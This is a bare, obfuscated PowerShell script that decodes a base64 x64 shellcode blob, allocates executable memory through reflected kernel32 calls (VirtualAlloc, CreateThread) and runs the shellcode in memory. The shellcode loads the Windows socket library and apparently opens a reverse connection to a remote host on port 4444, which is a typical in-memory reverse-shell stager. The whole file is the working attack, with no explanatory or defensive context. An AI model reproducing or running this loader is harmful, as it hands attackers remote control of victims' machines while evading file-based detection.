
function dEELf {
	Param ($rTqkC, $bkWM3)		
	$lGv = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $lGv.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($lGv.GetMethod('GetModuleHandle')).Invoke($null, @($rTqkC)))), $bkWM3))
}

function xk {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $ypTt,
		[Parameter(Position = 1)] [Type] $uoTs = [Void]
	)
	
	$w4zS7 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$w4zS7.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ypTt).SetImplementationFlags('Runtime, Managed')
	$w4zS7.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $uoTs, $ypTt).SetImplementationFlags('Runtime, Managed')
	
	return $w4zS7.CreateType()
}

[Byte[]]$dskor = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcke8ppkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$j3wy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dEELf kernel32.dll VirtualAlloc), (xk @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dskor.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($dskor, 0, $j3wy, $dskor.length)

$j8 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dEELf kernel32.dll CreateThread), (xk @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$j3wy,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dEELf kernel32.dll WaitForSingleObject), (xk @([IntPtr], [Int32]))).Invoke($j8,0xffffffff) | Out-Null
